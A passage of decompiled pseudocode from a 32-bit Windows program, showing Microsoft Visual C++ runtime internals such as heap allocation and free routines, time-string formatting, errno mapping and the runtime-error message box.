  void **v4; // [esp+Ch] [ebp-28h] BYREF
  _BYTE *v5; // [esp+10h] [ebp-24h]
  int v6; // [esp+14h] [ebp-20h] BYREF
  _DWORD *v7; // [esp+18h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+1Ch] [ebp-18h]

  if ( lpMem )
  {
    if ( dword_445D0C == 3 )
    {
      _lock(9);
      ms_exc.registration.TryLevel = 0;
      block = (_DWORD *)__sbh_find_block(lpMem);
      v7 = block;
      if ( block )
        sub_40F856(block, (int)lpMem);
      ms_exc.registration.TryLevel = -1;
      _unlock(9);
      v2 = v7 == 0;
    }
    else
    {
      if ( dword_445D0C != 2 )
      {
LABEL_11:
        HeapFree(dword_445D08, 0, lpMem);
        return;
      }
      _lock(9);
      ms_exc.registration.TryLevel = 1;
      v3 = (_BYTE *)sub_410586((unsigned int)lpMem, &v4, (unsigned int *)&v6);
      v5 = v3;
      if ( v3 )
        sub_4105DD((int)v4, v6, v3);
      ms_exc.registration.TryLevel = -1;
      _unlock(9);
      v2 = v5 == 0;
    }
    if ( !v2 )
      return;
    goto LABEL_11;
  }
}
// 40F82B: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 445D0C: using guessed type int dword_445D0C;

//----- (0040AE3D) --------------------------------------------------------
LPVOID __cdecl sub_40AE3D(unsigned int a1)
{
  LPVOID result; // eax
  unsigned int v2; // esi
  int v3; // eax
  SIZE_T v4; // eax
  void *v5; // [esp+Ch] [ebp-1Ch]
  int v6; // [esp+Ch] [ebp-1Ch]

  if ( dword_445D0C == 3 )
  {
    if ( a1 <= dword_445D04 )
    {
      _lock(9);
      v5 = (void *)__sbh_alloc_block(a1);
      _unlock(9);
      result = v5;
      if ( v5 )
        return result;
    }
    goto LABEL_12;
  }
  if ( dword_445D0C != 2 )
  {
LABEL_12:
    v3 = a1;
    if ( !a1 )
      v3 = 1;
    v4 = v3 + 15;
    LOBYTE(v4) = v4 & 0xF0;
    return HeapAlloc(dword_445D08, 0, v4);
  }
  if ( a1 )
    v2 = (a1 + 15) & 0xFFFFFFF0;
  else
    v2 = 16;
  if ( v2 > dword_42900C )
    return HeapAlloc(dword_445D08, 0, v2);
  _lock(9);
  v6 = sub_410622(v2 >> 4);
  _unlock(9);
  result = (LPVOID)v6;
  if ( !v6 )
    return HeapAlloc(dword_445D08, 0, v2);
  return result;
}
// 40FB7F: using guessed type _DWORD __cdecl __sbh_alloc_block(_DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42900C: using guessed type int dword_42900C;
// 445D04: using guessed type int dword_445D04;
// 445D0C: using guessed type int dword_445D0C;

//----- (0040B651) --------------------------------------------------------
void *__cdecl sub_40B651(LPVOID lpMem, SIZE_T dwBytes)
{
  void *v2; // ebx
  void *result; // eax
  unsigned int v4; // esi
  _DWORD *block; // eax
  size_t v6; // eax
  size_t v7; // eax
  _BYTE *v8; // eax
  _BYTE *v9; // edi
  size_t v10; // eax
  size_t v11; // eax
  void **v12; // [esp+Ch] [ebp-38h] BYREF
  size_t v13; // [esp+10h] [ebp-34h]
  _BYTE *v14; // [esp+14h] [ebp-30h]
  _DWORD *v15; // [esp+18h] [ebp-2Ch] BYREF
  _DWORD *v16; // [esp+1Ch] [ebp-28h]
  void *v17; // [esp+20h] [ebp-24h]
  size_t v18; // [esp+24h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+2Ch] [ebp-18h]

  v2 = lpMem;
  if ( !lpMem )
    return malloc(dwBytes);
  v4 = dwBytes;
  if ( dwBytes )
  {
    if ( dword_445D0C == 3 )
    {
      while ( 1 )
      {
        v17 = 0;
        if ( v4 <= 0xFFFFFFE0 )
        {
          _lock(9);
          ms_exc.registration.TryLevel = 0;
          block = (_DWORD *)__sbh_find_block(lpMem);
          v16 = block;
          if ( block )
          {
            if ( v4 <= dword_445D04 )
            {
              if ( __sbh_resize_block(block, lpMem, v4) )
              {
                v17 = lpMem;
              }
              else
              {
                v17 = (void *)__sbh_alloc_block(v4);
                if ( v17 )
                {
                  v6 = *((_DWORD *)lpMem - 1) - 1;
                  v18 = v6;
                  if ( v6 >= v4 )
                    v6 = v4;
                  memcpy_0(v17, lpMem, v6);
                  v16 = (_DWORD *)__sbh_find_block(lpMem);
                  sub_40F856(v16, (int)lpMem);
                }
              }
            }
            if ( !v17 )
            {
              if ( !v4 )
                v4 = 1;
              v4 = (v4 + 15) & 0xFFFFFFF0;
              v17 = HeapAlloc(dword_445D08, 0, v4);
              if ( v17 )
              {
                v7 = *((_DWORD *)lpMem - 1) - 1;
                v18 = v7;
                if ( v7 >= v4 )
                  v7 = v4;
                memcpy_0(v17, lpMem, v7);
                sub_40F856(v16, (int)lpMem);
              }
            }
          }
          ms_exc.registration.TryLevel = -1;
          _unlock(9);
          if ( !v16 )
          {
            if ( !v4 )
              v4 = 1;
            v4 = (v4 + 15) & 0xFFFFFFF0;
            v17 = HeapReAlloc(dword_445D08, 0, lpMem, v4);
          }
        }
        result = v17;
        if ( v17 || !dword_444A28 )
          break;
        if ( !_callnewh(v4) )
          return 0;
      }
    }
    else if ( dword_445D0C == 2 )
    {
      if ( dwBytes <= 0xFFFFFFE0 )
        v4 = (dwBytes + 15) & 0xFFFFFFF0;
      while ( 1 )
      {
        v17 = 0;
        if ( v4 <= 0xFFFFFFE0 )
        {
          _lock(9);
          ms_exc.registration.TryLevel = 1;
          v8 = (_BYTE *)sub_410586((unsigned int)v2, &v12, (unsigned int *)&v15);
          v9 = v8;
          v14 = v8;
          if ( v8 )
          {
            if ( v4 < dword_42900C )
            {
              if ( sub_41094E((int)v12, v15, v8, v4 >> 4) )
              {
                v17 = lpMem;
              }
              else
              {
                v17 = (void *)sub_410622(v4 >> 4);
                if ( v17 )
                {
                  v10 = 16 * (unsigned __int8)*v9;
                  v13 = v10;
                  if ( v10 >= v4 )
                    v10 = v4;
                  memcpy_0(v17, lpMem, v10);
                  sub_4105DD((int)v12, (int)v15, v9);
                }
              }
              v2 = lpMem;
            }
            if ( !v17 )
            {
              v17 = HeapAlloc(dword_445D08, 0, v4);
              if ( v17 )
              {
                v11 = 16 * (unsigned __int8)*v9;
                v13 = v11;
                if ( v11 >= v4 )
                  v11 = v4;
                memcpy_0(v17, v2, v11);
                sub_4105DD((int)v12, (int)v15, v9);
              }
            }
          }
          else
          {
            v17 = HeapReAlloc(dword_445D08, 0, v2, v4);
          }
          ms_exc.registration.TryLevel = -1;
          _unlock(9);
        }
        result = v17;
        if ( v17 || !dword_444A28 )
          break;
        if ( !_callnewh(v4) )
          return 0;
      }
    }
    else
    {
      while ( 1 )
      {
        result = 0;
        if ( v4 <= 0xFFFFFFE0 )
        {
          if ( !v4 )
            v4 = 1;
          v4 = (v4 + 15) & 0xFFFFFFF0;
          result = HeapReAlloc(dword_445D08, 0, lpMem, v4);
        }
        if ( result || !dword_444A28 )
          break;
        if ( !_callnewh(v4) )
          return 0;
      }
    }
  }
  else
  {
    sub_40AD16(lpMem);
    return 0;
  }
  return result;
}
// 40B7F5: conditional instruction was optimized away because %dwBytes.4 is in (1..FFFFFFE0)
// 40F82B: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 40FB7F: using guessed type _DWORD __cdecl __sbh_alloc_block(_DWORD);
// 410034: using guessed type _DWORD __cdecl __sbh_resize_block(_DWORD, _DWORD, _DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42900C: using guessed type int dword_42900C;
// 445D04: using guessed type int dword_445D04;
// 445D0C: using guessed type int dword_445D0C;

//----- (0040C072) --------------------------------------------------------
int __cdecl sub_40C072(int a1, int a2)
{
  unsigned int v2; // esi
  int result; // eax
  void *v4; // [esp+14h] [ebp-20h]
  size_t v5; // [esp+18h] [ebp-1Ch]

  v2 = a2 * a1;
  v5 = a2 * a1;
  if ( (unsigned int)(a2 * a1) <= 0xFFFFFFE0 )
  {
    if ( !v2 )
      v2 = 1;
    v2 = (v2 + 15) & 0xFFFFFFF0;
  }
  while ( 1 )
  {
    v4 = 0;
    if ( v2 <= 0xFFFFFFE0 )
    {
      if ( dword_445D0C == 3 )
      {
        if ( v5 > dword_445D04 )
          goto LABEL_14;
        _lock(9);
        v4 = (void *)__sbh_alloc_block(v5);
        _unlock(9);
        if ( v4 )
        {
          memset(v4, 0, v5);
          goto LABEL_14;
        }
LABEL_15:
        v4 = HeapAlloc(dword_445D08, 8u, v2);
        goto LABEL_16;
      }
      if ( dword_445D0C == 2 && v2 <= dword_42900C )
      {
        _lock(9);
        v4 = (void *)sub_410622(v2 >> 4);
        _unlock(9);
        if ( !v4 )
          goto LABEL_15;
        memset(v4, 0, v2);
      }
LABEL_14:
      if ( v4 )
        return (int)v4;
      goto LABEL_15;
    }
LABEL_16:
    if ( v4 || !dword_444A28 )
      return (int)v4;
    result = _callnewh(v2);
    if ( !result )
      return result;
  }
}
// 40FB7F: using guessed type _DWORD __cdecl __sbh_alloc_block(_DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42900C: using guessed type int dword_42900C;
// 445D04: using guessed type int dword_445D04;
// 445D0C: using guessed type int dword_445D0C;

//----- (0040CCEA) --------------------------------------------------------
unsigned int __cdecl sub_40CCEA(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4)
{
  return sub_40CD05(a1, a2, a3, a4, 0);
}

//----- (0040CD05) --------------------------------------------------------
unsigned int __cdecl sub_40CD05(unsigned __int8 *a1, unsigned int a2, unsigned __int8 *a3, int a4, char **a5)
{
  char **v5; // eax
  unsigned __int8 *v6; // esi
  unsigned __int8 v7; // al
  char *v8; // esi
  int v10; // [esp+Ch] [ebp-8h]
  unsigned int v11; // [esp+10h] [ebp-4h] BYREF

  v11 = a2;
  InterlockedIncrement(&Addend);
  if ( dword_445CE4 )
  {
    InterlockedDecrement(&Addend);
    _lock(19);
    v10 = 1;
  }
  else
  {
    v10 = 0;
  }
  v5 = a5;
  if ( !a5 )
    v5 = off_426B78;
  a5 = v5;
  if ( v11 )
  {
    v6 = a3;
    do
    {
      v7 = *v6;
      if ( !*v6 )
        break;
      if ( v7 == 37 )
      {
        dword_446048 = 0;
        v8 = (char *)(v6 + 1);
        if ( *v8 == 35 )
        {
          dword_446048 = 1;
          ++v8;
        }
        _expandtime(*v8, a4, &a1, &v11, a5);
        v6 = (unsigned __int8 *)(v8 + 1);
      }
      else
      {
        if ( *((char *)off_4291FC + 2 * v7 + 1) < 0 && v11 > 1 )
        {
          *a1++ = v7;
          ++v6;
          --v11;
        }
        *a1++ = *v6++;
        --v11;
      }
    }
    while ( v11 );
  }
  if ( v10 )
    _unlock(19);
  else
    InterlockedDecrement(&Addend);
  if ( !v11 )
    return 0;
  *a1 = 0;
  return a2 - v11;
}
// 40CDFF: using guessed type _DWORD __cdecl _expandtime(char, _DWORD, _DWORD, _DWORD, _DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 426B78: using guessed type char **off_426B78;
// 4291FC: using guessed type void *off_4291FC;
// 445CE4: using guessed type int dword_445CE4;
// 446048: using guessed type int dword_446048;

//----- (0040D2CD) --------------------------------------------------------
void __cdecl sub_40D2CD(char *String1, int a2, _DWORD *a3, _DWORD *a4, int a5)
{
  char *v5; // ebx
  int v8; // ecx
  _BYTE *v9; // eax
  char *v10; // ebx
  unsigned __int8 v11; // al
  unsigned __int8 *v12; // eax
  unsigned __int8 v13; // cl
  char String1_3; // [esp+1Bh] [ebp+Bh]
  int v15; // [esp+20h] [ebp+10h]
  int v16; // [esp+20h] [ebp+10h]
  char v17; // [esp+24h] [ebp+14h]

  v5 = String1;
  while ( *v5 )
  {
    v8 = 0;
    if ( !*a4 )
      return;
    dword_44604C = 0;
    String1_3 = *v5;
    v15 = (int)(v5 + 1);
    do
    {
      v9 = (_BYTE *)v15;
      ++v8;
      ++v15;
    }
    while ( *v9 == String1_3 );
    v16 = v15 - 1;
    if ( String1_3 > 100 )
    {
      switch ( String1_3 )
      {
        case 'h':
          if ( v8 == 1 )
          {
            dword_44604C = 1;
          }
          else if ( v8 != 2 )
          {
LABEL_12:
            if ( *((char *)off_4291FC + 2 * (unsigned __int8)String1_3 + 1) < 0 )
            {
              ++v5;
              *(_BYTE *)(*a3)++ = String1_3;
              --*a4;
            }
            *(_BYTE *)(*a3)++ = *v5++;
            --*a4;
            continue;
          }
          v17 = 73;
          break;
        case 'm':
          if ( v8 == 1 )
          {
            dword_44604C = 1;
          }
          else if ( v8 != 2 )
          {
            goto LABEL_12;
          }
          v17 = 77;
          break;
        case 's':
          if ( v8 == 1 )
          {
            dword_44604C = 1;
          }
          else if ( v8 != 2 )
          {
            goto LABEL_12;
          }
          v17 = 83;
          break;
        case 't':
          if ( *(int *)(a2 + 8) > 11 )
            v12 = *(unsigned __int8 **)(a5 + 156);
          else
            v12 = *(unsigned __int8 **)(a5 + 152);
          if ( v8 == 1 && *a4 )
          {
            if ( *((char *)off_4291FC + 2 * *v12 + 1) < 0 && *a4 > 1u )
            {
              *(_BYTE *)(*a3)++ = *v12++;
              --*a4;
            }
            *(_BYTE *)(*a3)++ = *v12;
            --*a4;
          }
          else
          {
            while ( 1 )
            {
              v13 = *v12;
              if ( !*v12 || !*a4 )
                break;
              if ( *((char *)off_4291FC + 2 * v13 + 1) < 0 && *a4 > 1u )
              {
                *(_BYTE *)(*a3)++ = v13;
                ++v12;
                --*a4;
              }
              *(_BYTE *)(*a3)++ = *v12++;
              --*a4;
            }
          }
          goto LABEL_73;
        case 'y':
          if ( v8 == 2 )
          {
            v17 = 121;
          }
          else
          {
            if ( v8 != 4 )
              goto LABEL_12;
            v17 = 89;
          }
          break;
        default:
          goto LABEL_12;
      }
    }
    else
    {
      switch ( String1_3 )
      {
        case 'd':
          if ( v8 == 1 )
          {
            dword_44604C = 1;
          }
          else if ( v8 != 2 )
          {
            if ( v8 == 3 )
            {
              v17 = 97;
            }
            else
            {
              if ( v8 != 4 )
                goto LABEL_12;
              v17 = 65;
            }
            break;
          }
          v17 = 100;
          break;
        case '\'':
          if ( (v8 & 1) != 0 )
          {
            for ( v5 += v8; ; ++v5 )
            {
              v11 = *v5;
              if ( !*v5 || !*a4 )
                break;
              if ( v11 == 39 )
              {
                ++v5;
                goto LABEL_15;
              }
              if ( *((char *)off_4291FC + 2 * v11 + 1) < 0 && *a4 > 1u )
              {
                *(_BYTE *)(*a3)++ = v11;
                ++v5;
                --*a4;
              }
              *(_BYTE *)(*a3)++ = *v5;
              --*a4;
            }
          }
          else
          {
            v5 += v8;
          }
          continue;
        case 'A':
          goto LABEL_30;
        case 'H':
          if ( v8 == 1 )
          {
            dword_44604C = 1;
          }
          else if ( v8 != 2 )
          {
            goto LABEL_12;
          }
          v17 = 72;
          break;
        case 'M':
          if ( v8 == 1 )
          {
            dword_44604C = 1;
          }
          else if ( v8 != 2 )
          {
            if ( v8 == 3 )
            {
              v17 = 98;
            }
            else
            {
              if ( v8 != 4 )
                goto LABEL_12;
              v17 = 66;
            }
            break;
          }
          v17 = 109;
          break;
        case 'a':
LABEL_30:
          if ( !_strcmpi(v5, "am/pm") )
          {
            v10 = v5 + 5;
            goto LABEL_34;
          }
          if ( !_strcmpi(v5, "a/p") )
          {
            v10 = v5 + 3;
LABEL_34:
            v16 = (int)v10;
          }
          v17 = 112;
          break;
        default:
          goto LABEL_12;
      }
    }
    _expandtime(v17, a2, a3, a4, a5);
LABEL_73:
    v5 = (char *)v16;
LABEL_15:
    ;
  }
}
// 40CDFF: using guessed type _DWORD __cdecl _expandtime(char, _DWORD, _DWORD, _DWORD, _DWORD);
// 4291FC: using guessed type void *off_4291FC;
// 44604C: using guessed type int dword_44604C;

//----- (0040DAD9) --------------------------------------------------------
LPVOID __cdecl sub_40DAD9(LPVOID lpMem, unsigned int a2)
{
  unsigned int v2; // esi
  int block; // eax
  unsigned int v5; // esi
  _BYTE *v6; // eax
  void **v7; // [esp+Ch] [ebp-2Ch] BYREF
  _BYTE *v8; // [esp+10h] [ebp-28h]
  _DWORD *v9; // [esp+14h] [ebp-24h] BYREF
  int v10; // [esp+18h] [ebp-20h]
  LPVOID v11; // [esp+1Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h] BYREF

  v2 = a2;
  if ( a2 > 0xFFFFFFE0 )
    return 0;
  if ( dword_445D0C == 3 )
  {
    _lock(9);
    ms_exc.registration.TryLevel = 0;
    block = __sbh_find_block(lpMem);
    v10 = block;
    if ( block )
    {
      v11 = 0;
      if ( a2 <= dword_445D04 )
      {
        if ( __sbh_resize_block(block, lpMem, a2) )
          v11 = lpMem;
      }
    }
    ms_exc.registration.TryLevel = -1;
    _unlock(9);
    if ( v10 )
      return v11;
    goto LABEL_20;
  }
  if ( dword_445D0C != 2 )
  {
LABEL_20:
    if ( !a2 )
      v2 = 1;
    v5 = (v2 + 15) & 0xFFFFFFF0;
    return HeapReAlloc(dword_445D08, 0x10u, lpMem, v5);
  }
  if ( !a2 )
    v2 = 1;
  v5 = (v2 + 15) & 0xFFFFFFF0;
  _lock(9);
  ms_exc.registration.TryLevel = 1;
  v6 = (_BYTE *)sub_410586((unsigned int)lpMem, &v7, (unsigned int *)&v9);
  v8 = v6;
  if ( v6 )
  {
    v11 = 0;
    if ( v5 <= dword_42900C && sub_41094E((int)v7, v9, v6, v5 >> 4) )
      v11 = lpMem;
    _local_unwind2(&ms_exc.registration, -1);
    return v11;
  }
  ms_exc.registration.TryLevel = -1;
  _unlock(9);
  if ( !v8 )
    return HeapReAlloc(dword_445D08, 0x10u, lpMem, v5);
  return v11;
}
// 40AC6A: using guessed type _DWORD __cdecl _local_unwind2(_DWORD, _DWORD);
// 40F82B: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 410034: using guessed type _DWORD __cdecl __sbh_resize_block(_DWORD, _DWORD, _DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 42900C: using guessed type int dword_42900C;
// 445D04: using guessed type int dword_445D04;
// 445D0C: using guessed type int dword_445D0C;

//----- (0040DC3D) --------------------------------------------------------
SIZE_T __cdecl sub_40DC3D(_DWORD *lpMem)
{
  int v1; // esi
  bool v2; // zf
  unsigned __int8 *v3; // eax
  void **v5; // [esp+Ch] [ebp-2Ch] BYREF
  unsigned __int8 *v6; // [esp+10h] [ebp-28h]
  unsigned int v7; // [esp+14h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-20h]
  int block; // [esp+1Ch] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  if ( dword_445D0C == 3 )
  {
    _lock(9);
    ms_exc.registration.TryLevel = 0;
    block = __sbh_find_block(lpMem);
    if ( block )
    {
      v1 = *(lpMem - 1) - 9;
      v8 = v1;
    }
    else
    {
      v1 = v8;
    }
    ms_exc.registration.TryLevel = -1;
    _unlock(9);
    v2 = block == 0;
  }
  else
  {
    if ( dword_445D0C != 2 )
      return HeapSize(dword_445D08, 0, lpMem);
    _lock(9);
    ms_exc.registration.TryLevel = 1;
    v3 = (unsigned __int8 *)sub_410586((unsigned int)lpMem, &v5, &v7);
    v6 = v3;
    if ( v3 )
    {
      v1 = 16 * *v3;
      v8 = v1;
    }
    else
    {
      v1 = v8;
    }
    ms_exc.registration.TryLevel = -1;
    _unlock(9);
    v2 = v6 == 0;
  }
  if ( v2 )
    return HeapSize(dword_445D08, 0, lpMem);
  return v1;
}
// 40F82B: using guessed type _DWORD __cdecl __sbh_find_block(_DWORD);
// 410A20: using guessed type _DWORD __cdecl _lock(_DWORD);
// 410A81: using guessed type _DWORD __cdecl _unlock(_DWORD);
// 445D0C: using guessed type int dword_445D0C;

//----- (0040DD2B) --------------------------------------------------------
int *__cdecl sub_40DD2B(unsigned int a1)
{
  int v1; // esi
  _DWORD *v2; // eax
  int *result; // eax

  v1 = 0;
  *__doserrno() = a1;
  v2 = &unk_426D28;
  do
  {
    if ( a1 == *v2 )
    {
      result = _errno();
      *result = dword_426D2C[2 * v1];
      return result;
    }
    v2 += 2;
    ++v1;
  }
  while ( v2 < dword_426E90 );
  if ( a1 < 0x13 || a1 > 0x24 )
  {
    if ( a1 < 0xBC || a1 > 0xCA )
    {
      result = _errno();
      *result = 22;
    }
    else
    {
      result = _errno();
      *result = 8;
    }
  }
  else
  {
    result = _errno();
    *result = 13;
  }
  return result;
}
// 426D2C: using guessed type int dword_426D2C[89];
// 426E90: using guessed type _DWORD dword_426E90[30];

//----- (0040E198) --------------------------------------------------------
int sub_40E198()
{
  return flsall(1);
}
// 40E1A1: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (0040E2C2) --------------------------------------------------------
void __noreturn sub_40E2C2()
{
  _amsg_exit(0x19u);
}
// 40E2C2: using guessed type void __noreturn sub_40E2C2();

//----- (0040EB5D) --------------------------------------------------------
char __cdecl sub_40EB5D(int a1)
{
  HMODULE ModuleHandleA; // eax
  int v2; // ecx

  *(_DWORD *)a1 = 0;
  ModuleHandleA = GetModuleHandleA(0);
  if ( *(_WORD *)ModuleHandleA == 23117 )
  {
    v2 = *((_DWORD *)ModuleHandleA + 15);
    if ( v2 )
    {
      ModuleHandleA = (HMODULE)((char *)ModuleHandleA + v2);
      *(_BYTE *)a1 = *((_BYTE *)ModuleHandleA + 26);
      LOBYTE(ModuleHandleA) = *((_BYTE *)ModuleHandleA + 27);
      *(_BYTE *)(a1 + 1) = (_BYTE)ModuleHandleA;
    }
  }
  return (char)ModuleHandleA;
}

//----- (0040EB8A) --------------------------------------------------------
int sub_40EB8A()
{
  int result; // eax
  CHAR *i; // ecx
  char v2; // al
  CHAR *v3; // eax
  CHAR *j; // ecx
  char v5; // al
  char *v6; // eax
  const char *v7; // eax
  const char *v8; // ecx
  CHAR Buffer[4240]; // [esp+4h] [ebp-122Ch] BYREF
  CHAR Filename[260]; // [esp+1094h] [ebp-19Ch] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+1198h] [ebp-98h] BYREF
  char v12[4]; // [esp+122Ch] [ebp-4h] BYREF

  VersionInformation.dwOSVersionInfoSize = 148;
  if ( GetVersionExA(&VersionInformation)
    && VersionInformation.dwPlatformId == 2
    && VersionInformation.dwMajorVersion >= 5 )
  {
    return 1;
  }
  if ( !GetEnvironmentVariableA("__MSVCRT_HEAP_SELECT", Buffer, 0x1090u) )
    goto LABEL_29;
  for ( i = Buffer; *i; ++i )
  {
    v2 = *i;
    if ( *i >= 97 && v2 <= 122 )
      *i = v2 - 32;
  }
  if ( !strncmp("__GLOBAL_HEAP_SELECTED", Buffer, 0x16u) )
  {
    v3 = Buffer;
  }
  else
  {
    GetModuleFileNameA(0, Filename, 0x104u);
    for ( j = Filename; *j; ++j )
    {
      v5 = *j;
      if ( *j >= 97 && v5 <= 122 )
        *j = v5 - 32;
    }
    v3 = strstr(Buffer, Filename);
  }
  if ( !v3 )
    goto LABEL_29;
  v6 = strchr(v3, 44);
  if ( !v6 )
    goto LABEL_29;
  v7 = v6 + 1;
  v8 = v7;
  while ( *v8 )
  {
    if ( *v8 == 59 )
      *v8 = 0;
    else
      ++v8;
  }
  result = strtol(v7, 0, 10);
  if ( result != 2 && result != 3 && result != 1 )
  {
LABEL_29:
    sub_40EB5D((int)v12);
    return 3 - (v12[0] < 6u);
  }
  return result;
}
// 40EB8A: using guessed type char var_4[4];

//----- (0040ECD2) --------------------------------------------------------
int __cdecl sub_40ECD2(int a1)
{
  int v1; // eax
  void **v2; // eax

  dword_445D08 = HeapCreate(a1 == 0, 0x1000u, 0);
  if ( !dword_445D08 )
    return 0;
  v1 = sub_40EB8A();
  dword_445D0C = v1;
  if ( v1 == 3 )
  {
    v2 = (void **)__sbh_heap_init(1016);
  }
  else
  {
    if ( v1 != 2 )
      return 1;
    v2 = sub_41032A();
  }
  if ( !v2 )
  {
    HeapDestroy(dword_445D08);
    return 0;
  }
  return 1;
}
// 40F7E3: using guessed type _DWORD __cdecl __sbh_heap_init(_DWORD);
// 445D0C: using guessed type int dword_445D0C;

//----- (0040ED68) --------------------------------------------------------
int *__cdecl sub_40ED68(DWORD NumberOfBytesWritten)
{
  int v1; // ecx
  int *result; // eax
  int v3; // esi
  char *v4; // edi
  const char **v5; // esi
  HANDLE StdHandle; // eax
  const char *v7; // [esp-14h] [ebp-1B8h]
  DWORD v8; // [esp-10h] [ebp-1B4h]
  DWORD *p_NumberOfBytesWritten; // [esp-Ch] [ebp-1B0h]
  int v10; // [esp-8h] [ebp-1ACh]
  CHAR Filename[260]; // [esp+0h] [ebp-1A4h] BYREF
  char Destination[160]; // [esp+104h] [ebp-A0h] BYREF
  int savedregs; // [esp+1A4h] [ebp+0h] BYREF

  v1 = 0;
  result = dword_426F48;
  do
  {
    if ( NumberOfBytesWritten == *result )
      break;
    result += 2;
    ++v1;
  }
  while ( result < (int *)&off_426FD8 );
  v3 = 2 * v1;
  if ( NumberOfBytesWritten == dword_426F48[2 * v1] )
  {
    result = (int *)dword_444820;
    if ( dword_444820 == 1 || !dword_444820 && dword_426ACC == 1 )
    {
      v5 = (const char **)&(&off_426F4C)[v3];
      v10 = 0;
      p_NumberOfBytesWritten = &NumberOfBytesWritten;
      v8 = strlen(*v5);
      v7 = *v5;
      StdHandle = GetStdHandle(0xFFFFFFF4);
      return (int *)WriteFile(StdHandle, v7, v8, &NumberOfBytesWritten, 0);
    }
    else if ( NumberOfBytesWritten != 252 )
    {
      if ( !GetModuleFileNameA(0, Filename, 0x104u) )
        strcpy(Filename, "<program name unknown>");
      v4 = Filename;
      if ( strlen(Filename) + 1 > 0x3C )
      {
        v4 = (char *)&savedregs + strlen(Filename) - 479;
        strncpy(v4, "...", 3u);
      }
      strcpy(Destination, "Runtime Error!\n\nProgram: ");
      strcat(Destination, v4);
      strcat(Destination, "\n\n");
      strcat(Destination, (&off_426F4C)[v3]);
      return (int *)__crtMessageBoxA(Destination, "Microsoft Visual C++ Runtime Library", 73744);
    }
  }
  return result;
}
// 412E18: using guessed type _DWORD __cdecl __crtMessageBoxA(_DWORD, _DWORD, _DWORD);
// 426ACC: using guessed type int dword_426ACC;
// 426F48: using guessed type int dword_426F48[];
// 426F4C: using guessed type char *off_426F4C;
// 426FD8: using guessed type int (__stdcall *off_426FD8)(struct _EXCEPTION_POINTERS *ExceptionInfo);
// 444820: using guessed type int dword_444820;

//----- (0040F78D) --------------------------------------------------------
void __usercall __noreturn sub_40F78D(EXCEPTION_POINTERS *a1@<ecx>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v4; // [esp-Ch] [ebp-24h] BYREF
  int v5; // [esp-8h] [ebp-20h]
  int v6; // [esp-4h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+0h] [ebp-18h]

  ms_exc.registration.ScopeTable = stru_4205F8;
  ms_exc.registration.ExceptionHandler = _except_handler3;
  ms_exc.registration.Next = (struct _EH3_EXCEPTION_REGISTRATION *)NtCurrentTeb()->NtTib.ExceptionList;
  ms_exc.exc_ptr = a1;
  v6 = a2;
  v5 = a4;
  v4 = a3;
  ms_exc.old_esp = (DWORD)&v4;
  ms_exc.registration.TryLevel = 0;
  if ( off_426FE0 )
    off_426FE0(
      v4,
      v5,
      v6,
      ms_exc.old_esp,
      ms_exc.exc_ptr,
      ms_exc.registration.Next,
      ms_exc.registration.ExceptionHandler,
      ms_exc.registration.ScopeTable,
      1);
  ms_exc.registration.TryLevel = -1;
  terminate();
}
// 4205F8: using guessed type _SCOPETABLE_ENTRY stru_4205F8[2];
// 426FE0: using guessed type int (__cdecl *off_426FE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040F856) --------------------------------------------------------
_DWORD *__cdecl sub_40F856(_DWORD *a1, int a2)
{
  _DWORD *result; // eax
  int *v3; // esi
  unsigned int v4; // edi
  int v5; // ecx
  char *v6; // ebx
  unsigned int v7; // edx
  _BYTE *v8; // ecx
  unsigned int v9; // ebx
  bool v10; // zf
  _BYTE *v11; // ecx
  unsigned int v12; // ebx
  unsigned int v13; // edx
  unsigned int v14; // ebx
  unsigned int v15; // esi
  unsigned int v16; // esi
  _DWORD *v17; // ecx
  LPVOID *v18; // eax
  _DWORD *v19; // [esp+Ch] [ebp-10h]
  int v20; // [esp+10h] [ebp-Ch]
  int v21; // [esp+14h] [ebp-8h]
  int v22; // [esp+18h] [ebp-4h]
  char *v23; // [esp+28h] [ebp+Ch]
  int *v24; // [esp+28h] [ebp+Ch]
  char v25; // [esp+2Bh] [ebp+Fh]

  result = (_DWORD *)a1[4];
  v3 = (int *)(a2 - 4);
  v4 = (unsigned int)(a2 - a1[3]) >> 15;
  v19 = &result[129 * v4 + 81];
  v5 = *(_DWORD *)(a2 - 4) - 1;
  v22 = v5;
  if ( (v5 & 1) == 0 )
  {
    v6 = (char *)v3 + v5;
    v20 = *(int *)((char *)v3 + v5);
    v21 = *(_DWORD *)(a2 - 8);
    v23 = (char *)v3 + v5;
    if ( (v20 & 1) == 0 )
    {
      v7 = (v20 >> 4) - 1;
      if ( v7 > 0x3F )
        v7 = 63;
      if ( *((_DWORD *)v6 + 1) == *((_DWORD *)v6 + 2) )
      {
        if ( v7 >= 0x20 )
        {
          v11 = (char *)result + v7 + 4;
